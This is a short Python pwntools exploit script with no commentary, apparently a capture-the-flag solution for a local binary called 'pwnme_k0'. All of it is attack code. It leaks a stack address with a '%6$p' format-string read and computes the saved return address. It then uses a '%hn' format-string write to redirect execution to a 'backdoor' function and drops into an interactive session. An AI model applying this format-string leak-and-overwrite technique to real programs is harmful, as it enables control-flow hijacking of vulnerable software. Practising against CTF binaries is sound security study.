#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

p = process('./pwnme_k0')

def cmd(c):
	p.recvuntil('>')
	p.sendline(str(c))

def show():
	cmd(1)

def _edit(username, password):
	p.recvuntil(' lenth:20):')
	p.sendline(username)
	p.recvuntil(' lenth:20):')
	p.sendline(password)

def edit(username, password):
	cmd(2)
	_edit(username, password)

def quit():
	cmd(3)

backdoor = 0x00000000004008A6 # 0x00000000004008AA
# ret = 0x400d74

offset = 0x7fffffffe4d0 - 0x7fffffffe498

gdb.attach(p)

payload = '%6$p'
_edit('1', payload)
show()
p.recvuntil('1\n')
ret_addr = int(p.recvline()[2:-1], 16) - offset
info('ret_addr = ' + hex(ret_addr))

payload = '%{}c%8$hn'.format(0x08A6)
edit(p64(ret_addr), payload)
show()

p.interactive()

